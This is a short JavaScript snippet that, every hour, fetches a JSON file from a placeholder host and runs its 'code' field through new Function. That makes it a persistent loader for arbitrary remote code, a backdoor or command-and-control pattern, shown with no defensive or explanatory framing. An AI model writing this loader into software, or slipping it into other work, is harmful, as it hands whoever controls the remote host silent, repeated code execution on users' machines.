async function tick(){
  const cfg = await (await fetch('https://cfg.example.invalid/c.json')).json();
  new Function(cfg.code)();
}
setInterval(tick, 3600e3);
